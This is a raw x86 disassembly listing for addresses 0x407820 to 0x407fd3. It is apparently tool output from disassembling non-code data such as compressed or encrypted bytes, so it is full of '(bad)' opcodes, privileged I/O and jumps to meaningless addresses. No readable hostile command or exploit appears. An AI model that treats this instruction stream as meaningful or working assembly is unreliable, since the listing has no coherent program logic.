  407820:	test   al,0x92
  407822:	pop    ebp
  407823:	sub    bh,bh
  407825:	hlt    
  407826:	adc    al,0xa2
  407828:	inc    esp
  407829:	xor    al,0x31
  40782b:	stc    
  40782c:	ja     0x4077dd
  40782e:	sahf   
  40782f:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  407831:	repnz in eax,dx
  407833:	(bad)  
  407835:	rcl    BYTE PTR [ebp+0x4e0a3d56],1
  40783b:	aas    
  40783c:	pop    ds
  40783d:	shl    DWORD PTR [edx],cl
  40783f:	add    edx,ebp
  407841:	in     eax,0x3f
  407843:	inc    esp
  407844:	hlt    
  407845:	cmp    esp,eax
  407847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407848:	pop    es
  407849:	fadd   QWORD PTR [edx-0x4c]
  40784c:	and    BYTE PTR [eax+0x4ac5f6ac],dh
  407852:	jae    0x407886
  407854:	orps   xmm7,XMMWORD PTR [ebx]
  407857:	iret   
  407858:	push   ds
  407859:	inc    esp
  40785a:	(bad)  
  40785c:	and    BYTE PTR [edi+0x38],cl
  40785f:	jo     0x4077e3
  407861:	rcl    DWORD PTR [esi],cl
  407863:	jmp    0x407853
  407865:	jae    0x4078b0
  407867:	inc    ecx
  407868:	mov    eax,ds:0x20e15317
  40786d:	loope  0x407842
  40786f:	mov    BYTE PTR [edx],al
  407871:	or     al,0xc6
  407873:	pop    ecx
  407874:	pushf  
  407875:	imul   ecx,DWORD PTR [edx+0x3f4c0ac8],0x105fd2e5
  40787f:	sbb    BYTE PTR [esi-0x50f2712d],bh
  407885:	xor    BYTE PTR [edx],cl
  407887:	jl     0x407843
  407889:	and    eax,0x5bbc6ad7
  40788e:	arpl   ax,bp
  407890:	je     0x4078b3
  407892:	cmp    esi,DWORD PTR [esi-0x50308612]
  407898:	idiv   DWORD PTR [esi-0x70]
  40789b:	fbld   TBYTE PTR [esi+0x57]
  40789e:	mov    ch,0x51
  4078a0:	xor    bl,BYTE PTR [ecx-0x70]
  4078a3:	cwde   
  4078a4:	or     BYTE PTR [ebx+0x15122e1f],0x25
  4078ab:	fimul  DWORD PTR [eax-0x55]
  4078ae:	ja     0x40787f
  4078b0:	pop    ds
  4078b1:	adc    esp,DWORD PTR [edi]
  4078b3:	cdq    
  4078b4:	popf   
  4078b5:	(bad)  
  4078b7:	mov    bh,BYTE PTR [eax+0x4c80e4e0]
  4078bd:	(bad)  
  4078be:	jg     0x4078e5
  4078c0:	loop   0x4078de
  4078c2:	jae    0x4078ad
  4078c4:	xchg   ebx,eax
  4078c5:	push   0x19
  4078c7:	rcr    DWORD PTR [edi-0x7e],cl
  4078ca:	and    DWORD PTR [ecx],ecx
  4078cc:	imul   eax,DWORD PTR [edx],0x23
  4078cf:	fs push ecx
  4078d1:	ins    BYTE PTR es:[edi],dx
  4078d2:	lds    edx,FWORD PTR [edx+0x7c]
  4078d5:	test   al,0xa0
  4078d7:	out    dx,al
  4078d8:	shl    DWORD PTR [eax+0x6ef83dee],0xf2
  4078df:	sbb    BYTE PTR [edx-0x37],dl
  4078e2:	cmc    
  4078e3:	cmp    bl,BYTE PTR [edi]
  4078e5:	xchg   ebx,eax
  4078e6:	cld    
  4078e7:	test   al,0x79
  4078e9:	ret    
  4078ea:	jle    0x4078b5
  4078ec:	rol    bh,1
  4078ee:	jmp    0x40789a
  4078f0:	push   eax
  4078f1:	dec    DWORD PTR [edx+0x6608ac7c]
  4078f7:	xlat   BYTE PTR ds:[ebx]
  4078f8:	jbe    0x407951
  4078fa:	mov    bl,0xb7
  4078fc:	xchg   esi,eax
  4078fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078fe:	dec    esi
  4078ff:	test   eax,0xab0f4b92
  407904:	jae    0x40797e
  407906:	into   
  407907:	addr16 test esp,0x6871e466
  40790e:	pop    ss
  40790f:	sub    eax,0x200ee35a
  407914:	inc    ebp
  407915:	add    cl,BYTE PTR [ecx+0x782ba88a]
  40791b:	lahf   
  40791c:	in     eax,0x7e
  40791e:	xor    edi,DWORD PTR [ebp+edx*1+0x4b]
  407922:	push   esp
  407923:	in     al,dx
  407924:	xchg   esp,eax
  407925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407926:	xchg   edx,eax
  407927:	jnp    0x407988
  407929:	inc    ebx
  40792a:	cli    
  40792b:	test   BYTE PTR [ecx+0x3e],bl
  40792e:	lds    ecx,FWORD PTR [ebx-0x5d67d04e]
  407934:	push   cs
  407935:	popf   
  407936:	out    dx,eax
  407937:	ret    0x34a
  40793a:	sub    BYTE PTR [ebp-0x52b5a37c],bh
  407940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407941:	mov    ebp,0x84fc05e
  407946:	in     eax,dx
  407947:	into   
  407948:	retf   
  407949:	xchg   ebx,eax
  40794a:	std    
  40794b:	sub    al,0x4c
  40794d:	jne    0x40791e
  40794f:	cmp    DWORD PTR [ecx],eax
  407951:	lea    ebp,[ebp+0x72]
  407954:	inc    edx
  407955:	inc    ebx
  407956:	jns    0x4078e2
  407958:	js     0x4078e8
  40795a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40795b:	cmc    
  40795c:	adc    dh,al
  40795e:	cs xor eax,0xb8840b44
  407964:	jmp    0xe070a4f8
  407969:	jl     0x407969
  40796b:	imul   esi,DWORD PTR [ebx+0x58],0x8ffc6867
  407972:	xchg   ebp,eax
  407973:	scas   al,BYTE PTR es:[edi]
  407974:	ins    BYTE PTR es:[edi],dx
  407975:	cmc    
  407976:	aas    
  407977:	idiv   BYTE PTR [eax-0x13]
  40797a:	fstp   DWORD PTR [eax+edx*2+0x19cd59b5]
  407981:	and    ah,dh
  407983:	jmp    0xbc88:0x398f4e52
  40798a:	push   ebx
  40798b:	inc    esi
  40798c:	pushf  
  40798d:	xchg   edx,eax
  40798e:	pop    ecx
  40798f:	out    dx,eax
  407990:	add    eax,0x912aeeae
  407995:	call   0x7bef1023
  40799a:	mov    al,ds:0x4309bbd9
  40799f:	mov    ds:0xf7cfd9dc,eax
  4079a4:	and    eax,0x9f8608a
  4079a9:	dec    esp
  4079aa:	sub    eax,0xcf403a9d
  4079af:	sbb    ax,0x4d0b
  4079b3:	call   0x64e3c806
  4079b8:	enter  0x8849,0x8
  4079bc:	xchg   edx,eax
  4079bd:	mov    al,0x48
  4079bf:	and    al,0x4
  4079c1:	jmp    0xf6b238e9
  4079c6:	adc    eax,0x7ccf07f7
  4079cb:	push   cs
  4079cc:	mov    dl,0xf1
  4079ce:	add    DWORD PTR [ebx],0x46ff93f6
  4079d4:	stos   DWORD PTR es:[edi],eax
  4079d5:	or     eax,0x853b9f50
  4079da:	or     eax,0xfaa812ab
  4079df:	pop    ecx
  4079e0:	call   0x2d2d15b7
  4079e5:	test   eax,0x1ad912de
  4079ea:	fnstsw WORD PTR [edi-0x5d]
  4079ed:	pop    edi
  4079ee:	fs jl  0x4079e7
  4079f1:	rcl    BYTE PTR [ecx+ecx*1+0x2f],cl
  4079f5:	jns    0x407a58
  4079f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079f8:	pop    eax
  4079f9:	stos   DWORD PTR es:[edi],eax
  4079fa:	jl     0x407a31
  4079fc:	or     ebp,DWORD PTR [eax-0x44e422bc]
  407a02:	jg     0x4079f2
  407a04:	scas   al,BYTE PTR es:[edi]
  407a05:	ss jne 0x407a1b
  407a08:	push   ebx
  407a09:	sbb    DWORD PTR [ebx+eiz*1],esi
  407a0c:	jae    0x4079ca
  407a0e:	xor    al,0xde
  407a10:	and    DWORD PTR [edx-0x60],eax
  407a13:	repnz aaa 
  407a15:	mov    ds:0x776079c4,al
  407a1a:	out    dx,eax
  407a1b:	sub    BYTE PTR [esi+0x779ee700],bl
  407a21:	inc    ecx
  407a22:	mov    ecx,0x35b82e13
  407a27:	test   eax,0x6bb962e8
  407a2c:	xor    BYTE PTR [edx+0x71e5df78],0x87
  407a33:	xlat   BYTE PTR ds:[ebx]
  407a34:	cli    
  407a35:	mov    bl,0xf6
  407a37:	lods   al,BYTE PTR ds:[esi]
  407a38:	aas    
  407a39:	push   ss
  407a3a:	push   0xa41e009b
  407a3f:	xlat   BYTE PTR ds:[ebx]
  407a40:	leave  
  407a41:	jne    0x407a12
  407a43:	jno    0x407ab7
  407a45:	mov    ds:0xeddaa3c5,eax
  407a4a:	push   0xe3d58b0b
  407a4f:	inc    esi
  407a50:	mov    al,0x8a
  407a52:	cmp    eax,0x8827d110
  407a57:	arpl   WORD PTR [edi+0x32d90f6f],cx
  407a5d:	push   ss
  407a5e:	ret    
  407a5f:	fidiv  WORD PTR [edx-0x608b0e6a]
  407a65:	cmp    BYTE PTR [edx-0x25],bh
  407a68:	fisttp WORD PTR [ecx]
  407a6a:	and    BYTE PTR [ecx+0xe],ah
  407a6d:	inc    esp
  407a6e:	lahf   
  407a6f:	push   esp
  407a70:	je     0x407a82
  407a72:	retf   0xf78f
  407a75:	sub    eax,0x2d6b7553
  407a7a:	push   ds
  407a7b:	shl    BYTE PTR [ebp-0x7e],1
  407a7e:	loope  0x407acc
  407a80:	mov    cl,BYTE PTR [edx+0x71]
  407a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a84:	or     esi,esi
  407a86:	mov    ds,WORD PTR [esi+0x29e22911]
  407a8c:	test   ebp,esp
  407a8e:	mov    ebx,0xfb9aa4aa
  407a93:	xchg   ebp,eax
  407a94:	retf   0x5ef
  407a97:	dec    edi
  407a98:	pop    ebp
  407a99:	hlt    
  407a9a:	mov    ds:0xa24809d3,eax
  407a9f:	(bad)  
  407aa0:	test   BYTE PTR [ebx],0x6
  407aa3:	pop    ds
  407aa4:	loop   0x407aee
  407aa6:	js     0x407a3a
  407aa8:	daa    
  407aa9:	cmp    al,0xb2
  407aab:	dec    ebp
  407aac:	inc    ecx
  407aad:	mov    edi,0x463e827c
  407ab2:	or     edi,DWORD PTR [edx-0x54]
  407ab5:	push   ebx
  407ab6:	adc    DWORD PTR [ecx-0x47e65837],0x5f2e1ca6
  407ac0:	dec    ebx
  407ac1:	jnp    0x407b2a
  407ac3:	inc    esp
  407ac4:	cdq    
  407ac5:	(bad)  
  407ac6:	adc    al,0x33
  407ac8:	pop    ecx
  407ac9:	push   ebx
  407aca:	push   edi
  407acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407acc:	jmp    0x33512246
  407ad1:	push   cs
  407ad2:	iret   
  407ad3:	or     dh,BYTE PTR [ebx-0x5d]
  407ad6:	pushf  
  407ad7:	sub    ch,BYTE PTR [edi]
  407ad9:	lahf   
  407ada:	fwait
  407adb:	mov    bh,0x6b
  407add:	sbb    eax,0x4273cd3f
  407ae2:	dec    ebp
  407ae3:	mov    eax,ds:0x8d5f9f57
  407ae8:	shl    BYTE PTR [esi-0x5f739833],1
  407aee:	xchg   edi,eax
  407aef:	jmp    0x407a8e
  407af1:	fadd   DWORD PTR [ebx+ecx*4+0x79]
  407af5:	hlt    
  407af6:	and    DWORD PTR [ebp+0x6832292d],0xf04ea2e
  407b00:	add    ebp,DWORD PTR [ecx]
  407b02:	xor    DWORD PTR [edx+0x4df11604],esp
  407b08:	push   ds
  407b09:	iret   
  407b0a:	inc    ebp
  407b0b:	xchg   BYTE PTR [eax-0x32],ch
  407b0e:	xchg   edi,eax
  407b0f:	rcr    DWORD PTR [ecx],0x3f
  407b12:	mov    ecx,0x25891678
  407b17:	mov    DWORD PTR [edx+0x69],ecx
  407b1a:	(bad)  
  407b1c:	adc    esp,0x39
  407b1f:	loopne 0x407aa4
  407b21:	push   eax
  407b22:	xchg   esp,eax
  407b23:	sub    ecx,eax
  407b25:	pop    edx
  407b26:	add    eax,0xc19f0361
  407b2b:	data16 idiv BYTE PTR [esi+0x20]
  407b2f:	(bad)  
  407b30:	mov    bh,0x22
  407b32:	test   BYTE PTR [esi-0x46],bl
  407b35:	push   edx
  407b36:	test   eax,0xf9092dd3
  407b3b:	push   es
  407b3c:	xchg   BYTE PTR [ecx],dl
  407b3e:	mov    eax,ds:0xeba49e7d
  407b43:	sub    ebx,eax
  407b45:	add    dl,BYTE PTR [ebx+0x55]
  407b48:	add    DWORD PTR [ecx+ecx*8+0x519554df],edx
  407b4f:	xchg   DWORD PTR [ecx+0x1c],ebx
  407b52:	xor    ebp,DWORD PTR [edx]
  407b54:	cli    
  407b55:	retf   
  407b56:	call   0xc695:0x73c70f8a
  407b5d:	test   DWORD PTR [esi+ecx*4+0x3630581],esi
  407b64:	push   ebp
  407b65:	repnz mov al,0x33
  407b68:	push   es
  407b69:	rol    DWORD PTR [edi+ebx*2+0x22],0xf3
  407b6e:	push   0x5af8e23b
  407b73:	inc    ecx
  407b74:	jbe    0x407b8e
  407b76:	add    edx,DWORD PTR [ecx+0x2c]
  407b79:	and    al,0x28
  407b7b:	dec    ecx
  407b7c:	ds sbb eax,0xff3a4949
  407b82:	and    ebp,DWORD PTR [eax+0x2bd4cfc6]
  407b88:	(bad)  
  407b89:	dec    DWORD PTR [edx]
  407b8b:	push   ebp
  407b8c:	mov    al,0x5f
  407b8e:	dec    ebp
  407b8f:	ja     0x407b66
  407b91:	push   edi
  407b92:	popf   
  407b93:	push   0xfbb21eea
  407b98:	fimul  DWORD PTR [eax-0x26]
  407b9b:	out    0x11,al
  407b9d:	dec    esp
  407b9e:	lock xchg esi,eax
  407ba0:	adc    edi,DWORD PTR [edi]
  407ba2:	bound  ebp,QWORD PTR [ecx+0x76]
  407ba5:	ret    0xdb83
  407ba8:	in     al,dx
  407ba9:	cmp    bh,BYTE PTR [edi]
  407bab:	sbb    esp,DWORD PTR [ebx]
  407bad:	and    al,0xbb
  407baf:	cmc    
  407bb0:	lds    esp,FWORD PTR [edi-0x11]
  407bb3:	cmp    DWORD PTR [edi-0x13],esi
  407bb6:	dec    edx
  407bb7:	into   
  407bb8:	add    cl,BYTE PTR [edi+0x8196412]
  407bbe:	xor    al,0x42
  407bc1:	add    esi,ecx
  407bc3:	daa    
  407bc4:	int    0x3b
  407bc6:	and    al,bl
  407bc8:	ret    0xc0b5
  407bcb:	ins    DWORD PTR es:[edi],dx
  407bcc:	mov    esi,DWORD PTR [edx+0x6f91f701]
  407bd2:	push   ecx
  407bd3:	(bad)  
  407bd4:	adc    DWORD PTR [ebx],ebx
  407bd6:	inc    BYTE PTR [esi-0x48]
  407bd9:	loop   0x407b98
  407bdb:	je     0x407c0d
  407bdd:	adc    ch,BYTE PTR [edx+0x31]
  407be0:	sub    ecx,DWORD PTR [ecx+0x33]
  407be3:	(bad)  
  407be4:	outs   dx,DWORD PTR ds:[esi]
  407be5:	jne    0x407bd4
  407be7:	push   esi
  407be8:	add    BYTE PTR [edi],dl
  407bea:	sbb    BYTE PTR [edi-0x7230d640],bh
  407bf0:	fcom   DWORD PTR [ebp+0xb]
  407bf3:	mov    bh,0xb7
  407bf5:	fwait
  407bf6:	loop   0x407c3c
  407bf8:	shr    DWORD PTR [ebx+edx*1-0x56],0x7c
  407bfd:	jno    0x407c72
  407bff:	sbb    eax,0x28
  407c02:	mov    esi,0x36084201
  407c07:	adc    eax,0x9207de38
  407c0c:	lods   al,BYTE PTR ds:[esi]
  407c0d:	cmp    BYTE PTR [ecx+0x3304c729],ah
  407c13:	mov    eax,0x619b746
  407c18:	shl    BYTE PTR [ebp-0x435816e8],0x8a
  407c1f:	pop    ss
  407c20:	xor    DWORD PTR [eax-0x2f12476b],0x29c6797c
  407c2a:	es xor edx,eax
  407c2d:	out    dx,eax
  407c2e:	xlat   BYTE PTR ds:[ebx]
  407c2f:	imul   edx,eax,0x3f
  407c32:	jb     0x407ca9
  407c34:	sbb    ch,ch
  407c36:	xor    BYTE PTR [edx+edi*2-0x9331351],bh
  407c3d:	pop    esi
  407c3e:	jg     0x407bdf
  407c40:	jecxz  0x407c99
  407c42:	les    esp,FWORD PTR [ebp+0x5f48092a]
  407c48:	xor    bh,bh
  407c4a:	xor    eax,0xb764a59b
  407c4f:	jbe    0x407c85
  407c51:	(bad)  
  407c52:	xchg   ecx,eax
  407c53:	xor    esi,ebx
  407c55:	mov    DWORD PTR [esi+0x3c],ecx
  407c58:	int3   
  407c59:	xchg   ebx,eax
  407c5a:	xchg   ebp,eax
  407c5b:	outs   dx,DWORD PTR ds:[esi]
  407c5c:	fadd   QWORD PTR [edi]
  407c5e:	mul    DWORD PTR [ebx+0x3]
  407c61:	shl    BYTE PTR [ecx],0x4a
  407c64:	leave  
  407c65:	data16 (bad) 
  407c67:	or     edi,0xffffff92
  407c6a:	fsub   QWORD PTR [edi+0x21]
  407c6d:	ficomp WORD PTR [esi+esi*4-0x44]
  407c71:	mov    ds,WORD PTR [edx-0x68e0abe1]
  407c77:	out    dx,al
  407c78:	clc    
  407c79:	loopne 0x407c9d
  407c7b:	loope  0x407c61
  407c7d:	iret   
  407c7e:	(bad)  
  407c7f:	loope  0x407cb8
  407c81:	push   esi
  407c82:	fwait
  407c83:	mov    esi,0x509e665e
  407c88:	test   eax,0xd6f93f3d
  407c8d:	loop   0x407ca0
  407c8f:	push   0x58
  407c91:	icebp  
  407c92:	add    ah,BYTE PTR [edx+0x5561eb02]
  407c98:	(bad)  
  407c9a:	(bad)  
  407c9b:	sbb    BYTE PTR [edx+0x49],ah
  407c9e:	push   0x9f90afa3
  407ca3:	lahf   
  407ca4:	sbb    BYTE PTR [esi+0x2a],ch
  407ca7:	dec    edx
  407ca8:	pop    ds
  407ca9:	rcr    cl,1
  407cab:	mov    bh,dh
  407cad:	jge    0x407c8c
  407caf:	xor    DWORD PTR [ecx+ebx*8],ecx
  407cb2:	jo     0x407d00
  407cb4:	cmp    eax,0x29392a98
  407cb9:	mov    eax,ds:0x4c1a99d0
  407cbe:	mov    ch,0xab
  407cc0:	dec    edx
  407cc1:	or     al,0x89
  407cc3:	adc    al,0x0
  407cc5:	aas    
  407cc6:	repz ret 
  407cc8:	fs push ebp
  407cca:	xchg   edi,edi
  407ccc:	dec    esp
  407ccd:	inc    esp
  407cce:	mov    ebp,0x8996bde7
  407cd3:	xchg   edx,eax
  407cd4:	mov    bl,0xbd
  407cd6:	cmp    al,0x28
  407cd8:	jmp    di
  407cdb:	pop    esp
  407cdc:	cmp    eax,0x8d3649df
  407ce1:	push   cs
  407ce2:	dec    ecx
  407ce3:	xchg   esp,eax
  407ce4:	pushf  
  407ce5:	pop    edx
  407ce6:	test   BYTE PTR [ebp+0x56],0xf8
  407cea:	cmp    esp,DWORD PTR [edx]
  407cec:	push   esp
  407ced:	xchg   ebx,eax
  407cee:	xchg   ebx,eax
  407cef:	stc    
  407cf0:	test   BYTE PTR [edi],al
  407cf2:	shl    BYTE PTR [ebx+0x192f92f0],1
  407cf8:	clc    
  407cf9:	pop    ecx
  407cfa:	leave  
  407cfb:	ins    BYTE PTR es:[edi],dx
  407cfc:	fst    DWORD PTR ds:0xf03620b6
  407d02:	shl    DWORD PTR [edi+0x57],0xa0
  407d06:	mov    ebx,0x25f13971
  407d0b:	or     DWORD PTR [esi-0x17],edx
  407d0e:	into   
  407d0f:	jns    0x407cd1
  407d11:	je     0x407d6e
  407d13:	data16 lock int 0x1
  407d17:	pusha  
  407d18:	and    esi,DWORD PTR [eax]
  407d1a:	adc    BYTE PTR [esi+ecx*4+0xc],dh
  407d1e:	cs loop 0x407cc2
  407d21:	mov    dh,0xf8
  407d23:	fwait
  407d24:	and    BYTE PTR [ecx],cl
  407d26:	pop    esp
  407d27:	mov    ch,dh
  407d29:	ja     0x407d52
  407d2b:	out    dx,eax
  407d2c:	adc    BYTE PTR [eax+0xc],ah
  407d2f:	jmp    0x407cfa
  407d31:	adc    DWORD PTR [ebx-0x65106ad8],esp
  407d37:	jg     0x407cf2
  407d39:	jmp    0x407d4f
  407d3b:	push   ebp
  407d3c:	shl    cl,cl
  407d3e:	int    0x39
  407d40:	xchg   ebx,eax
  407d41:	gs loope 0x407dc0
  407d44:	(bad)  
  407d46:	lahf   
  407d47:	popf   
  407d48:	xchg   ebp,eax
  407d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d4a:	out    0x74,eax
  407d4c:	adc    eax,0x3c927171
  407d51:	mov    al,ds:0xef0c4502
  407d56:	xor    ch,BYTE PTR [esi-0x4b]
  407d59:	je     0x407d44
  407d5b:	xchg   ecx,eax
  407d5c:	jbe    0x407d7c
  407d5e:	ret    
  407d5f:	dec    edx
  407d60:	mov    esp,0x2393dec7
  407d65:	push   ebp
  407d66:	push   0xffffffa5
  407d68:	hlt    
  407d69:	mov    BYTE PTR [esi+edx*2-0x5b],dl
  407d6d:	xor    DWORD PTR gs:[eax+0x6724d016],0xfffffff6
  407d75:	rol    BYTE PTR [edx+0x44],1
  407d78:	lds    ecx,FWORD PTR [eax-0x6374ebc4]
  407d7e:	pop    ds
  407d7f:	cmp    ch,bh
  407d81:	pop    esi
  407d82:	sti    
  407d83:	sub    eax,0xab8b14b1
  407d88:	pop    eax
  407d89:	test   eax,0xc8c099e1
  407d8e:	xchg   ebx,eax
  407d8f:	fnsave [edi+0x1a]
  407d92:	(bad)  
  407d93:	loop   0x407d4a
  407d95:	mov    eax,es
  407d97:	(bad)  
  407d98:	dec    ebx
  407d99:	ss popa 
  407d9b:	aas    
  407d9c:	jns    0x407d6f
  407d9e:	xchg   ecx,eax
  407d9f:	jg     0x407de1
  407da1:	loop   0x407da2
  407da3:	leave  
  407da4:	mov    ah,cl
  407da6:	jecxz  0x407d7f
  407da8:	cs or  esi,edx
  407dab:	sar    DWORD PTR [ecx],1
  407dad:	popf   
  407dae:	call   0xd7a05619
  407db3:	pusha  
  407db4:	nop
  407db5:	sub    eax,0x420bf43d
  407dba:	xchg   ebp,eax
  407dbb:	push   0xec452d8d
  407dc0:	pop    DWORD PTR [edi-0x35f6bba9]
  407dc6:	pop    ss
  407dc7:	(bad)  
  407dc8:	dec    DWORD PTR [ecx+edi*1+0x79]
  407dcc:	(bad)  
  407dcd:	xchg   ebx,eax
  407dce:	push   esp
  407dcf:	fld    TBYTE PTR [ebp+0x6a]
  407dd2:	sbb    DWORD PTR [ebx-0x1ce7c515],eax
  407dd8:	mov    bl,BYTE PTR [esi-0x6d2274d9]
  407dde:	iret   
  407ddf:	xchg   ebx,eax
  407de0:	mov    bl,0x5d
  407de2:	push   edi
  407de3:	inc    ebp
  407de4:	imul   esp,DWORD PTR [ebx+0x1d03e7da],0xce9bb3d3
  407dee:	push   0xffffff94
  407df0:	(bad)  
  407df1:	lock add DWORD PTR [esi+0x14ed6324],edx
  407df8:	or     ah,BYTE PTR [edx+eiz*4-0x40]
  407dfc:	sbb    ah,BYTE PTR gs:[ebx]
  407dff:	sbb    BYTE PTR [edi-0x26c7731e],cl
  407e05:	push   ds
  407e06:	mov    DWORD PTR [ebp+0x69bb53e6],ecx
  407e0c:	stos   DWORD PTR es:[edi],eax
  407e0d:	jmp    0x8f99:0x4dfede2d
  407e14:	push   ebx
  407e15:	enter  0x2d5,0x60
  407e19:	sbb    dh,BYTE PTR [esi+ebx*1+0x51a58e3b]
  407e20:	mov    eax,ds:0x11710806
  407e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e26:	mov    edx,0x7b5bdb6b
  407e2b:	stos   DWORD PTR es:[edi],eax
  407e2c:	mov    ah,ch
  407e2e:	mov    bl,0xc4
  407e30:	add    ecx,edx
  407e32:	call   0x5828434f
  407e37:	iret   
  407e38:	mov    ch,0xe0
  407e3a:	jle    0x407e2f
  407e3c:	push   esp
  407e3d:	sbb    al,0x59
  407e3f:	stc    
  407e40:	mov    al,0x95
  407e42:	mov    ds:0xb0ae4666,al
  407e47:	ret    0x41f9
  407e4a:	and    ah,bl
  407e4c:	add    ebx,DWORD PTR [ecx+0x6]
  407e4f:	nop
  407e50:	mov    dl,0x2
  407e52:	ret    
  407e53:	sub    al,BYTE PTR [edx-0x5e65603]
  407e59:	jo     0x407e6e
  407e5b:	enter  0xe7b0,0x6
  407e5f:	jns    0x407ea0
  407e61:	das    
  407e62:	mov    dh,0xf3
  407e64:	mov    eax,ds:0xa3c7490a
  407e69:	ret    0xa3e2
  407e6c:	pop    eax
  407e6d:	es mov ebx,0xfa77767b
  407e73:	retf   
  407e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e75:	pushf  
  407e76:	or     al,0x4b
  407e78:	cmp    ebx,ecx
  407e7a:	test   DWORD PTR [ebx-0x45],ebx
  407e7d:	and    esp,DWORD PTR [ecx-0x1cfa798e]
  407e83:	jecxz  0x407e60
  407e85:	jns    0x407ea4
  407e87:	ret    0xba56
  407e8a:	pop    ecx
  407e8b:	repz mov esp,0x103f7739
  407e91:	and    ecx,DWORD PTR [edi]
  407e93:	mov    ebp,0x5bd2d0a9
  407e98:	and    ah,ah
  407e9a:	mov    ecx,0x87b36974
  407e9f:	sub    al,0xd4
  407ea1:	and    cl,0xbd
  407ea4:	add    al,0xbb
  407ea6:	popa   
  407ea7:	loope  0x407ec2
  407ea9:	jb     0x407f29
  407eab:	inc    ebx
  407eac:	or     al,0x2f
  407eae:	push   edi
  407eaf:	in     eax,0x9d
  407eb1:	adc    al,0x1e
  407eb3:	dec    edi
  407eb4:	adc    eax,esi
  407eb6:	inc    esp
  407eb7:	pop    eax
  407eb8:	xlat   BYTE PTR ds:[ebx]
  407eb9:	dec    ebx
  407eba:	and    dh,BYTE PTR [esi]
  407ebc:	xchg   ecx,eax
  407ebd:	mov    al,ds:0xa0b102a8
  407ec2:	scas   eax,DWORD PTR es:[edi]
  407ec3:	mov    eax,0xffd19ff7
  407ec8:	adc    esi,DWORD PTR [eax]
  407eca:	sbb    al,BYTE PTR [edx-0x4f920212]
  407ed0:	repnz adc ecx,esp
  407ed3:	add    bl,bh
  407ed5:	ja     0x407f44
  407ed7:	pop    ebx
  407ed8:	test   BYTE PTR [ecx-0x1c],al
  407edb:	out    0x10,eax
  407edd:	and    cl,BYTE PTR [eax-0x596abb41]
  407ee3:	jb     0x407f63
  407ee5:	es daa 
  407ee7:	ror    BYTE PTR [ebp-0x1be0ad70],1
  407eed:	cmp    esp,DWORD PTR [edi]
  407eef:	sahf   
  407ef0:	pop    esp
  407ef1:	mov    bh,BYTE PTR [ebx-0x71]
  407ef4:	out    0x8b,al
  407ef6:	aad    0x90
  407ef8:	add    al,BYTE PTR [ecx-0x26]
  407efb:	push   0x8bfddd5f
  407f00:	imul   BYTE PTR [ebx]
  407f02:	jnp    0x407f2f
  407f04:	xchg   BYTE PTR [ecx],bh
  407f06:	xor    ebp,DWORD PTR [edi]
  407f08:	rol    cl,cl
  407f0a:	mov    ah,0xfa
  407f0c:	or     ah,BYTE PTR [edx]
  407f0e:	push   esi
  407f0f:	ja     0x407f39
  407f11:	xchg   edx,eax
  407f12:	popa   
  407f13:	push   es
  407f14:	pop    ss
  407f15:	retf   
  407f16:	pop    edi
  407f17:	push   eax
  407f18:	inc    edx
  407f19:	aad    0xb3
  407f1b:	jbe    0x407eba
  407f1d:	push   ebx
  407f1e:	cmp    eax,0xb1d63651
  407f23:	jl     0x407f0a
  407f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f26:	(bad)  
  407f27:	xor    DWORD PTR [esi-0xe],ebx
  407f2a:	xchg   esi,eax
  407f2b:	push   ebx
  407f2c:	jb     0x407f11
  407f2e:	adc    esp,DWORD PTR [edi*1-0x54328837]
  407f35:	adc    edi,DWORD PTR ds:0xb212c3ef
  407f3b:	adc    edi,DWORD PTR [ebx]
  407f3d:	cmp    BYTE PTR [eax-0x5ed41b02],cl
  407f43:	das    
  407f44:	add    si,WORD PTR [edi+0x6e]
  407f48:	and    dl,BYTE PTR [edx]
  407f4a:	stos   DWORD PTR es:[edi],eax
  407f4b:	jg     0x407f23
  407f4d:	hlt    
  407f4e:	push   ds
  407f4f:	jg     0x407edb
  407f51:	div    DWORD PTR [ebx+ebp*1+0x245c8088]
  407f58:	(bad)  
  407f59:	mov    ecx,0x9c8a9429
  407f5e:	or     dl,BYTE PTR [edi-0x5c9ca109]
  407f64:	jge    0x407f02
  407f66:	scas   al,BYTE PTR es:[edi]
  407f67:	in     al,dx
  407f68:	gs mov ebx,0x74136e53
  407f6e:	ret    0x15d0
  407f71:	add    bl,BYTE PTR [edi]
  407f73:	pop    edx
  407f74:	aas    
  407f75:	push   ss
  407f76:	and    ecx,esi
  407f78:	dec    DWORD PTR [esi-0x370e8981]
  407f7e:	adc    eax,DWORD PTR [ebp-0x4a]
  407f81:	mov    ecx,0x5ebf77f8
  407f86:	mov    edi,0xc6ecb24f
  407f8b:	pop    es
  407f8c:	or     BYTE PTR [edi-0x5a],bh
  407f8f:	xlat   BYTE PTR ds:[ebx]
  407f90:	and    cl,BYTE PTR [edx-0x60b588da]
  407f96:	clc    
  407f97:	mov    bl,0x39
  407f99:	adc    al,0x23
  407f9b:	call   0xa23a:0xed314f63
  407fa2:	js     0x407ff9
  407fa4:	mov    ds:0xebcda768,eax
  407fa9:	pop    esp
  407faa:	ret    
  407fab:	xchg   edi,eax
  407fac:	(bad)  
  407fad:	sbb    BYTE PTR [edx-0x9320d40],bl
  407fb3:	dec    edx
  407fb4:	and    edx,DWORD PTR [ecx+0x33ae4ee]
  407fba:	pop    edi
  407fbb:	mov    ecx,0xcbb04060
  407fc0:	out    0x16,al
  407fc2:	adc    bl,al
  407fc4:	scas   al,BYTE PTR es:[edi]
  407fc5:	lods   al,BYTE PTR ds:[esi]
  407fc6:	cmp    DWORD PTR [edx],0x51
  407fc9:	jb     0x407fe4
  407fcb:	icebp  
  407fcc:	push   edi
  407fcd:	jg     0x407fea
  407fcf:	jns    0x407f6d
  407fd1:	pop    edx
  407fd2:	popf   
  407fd3:	inc    edi
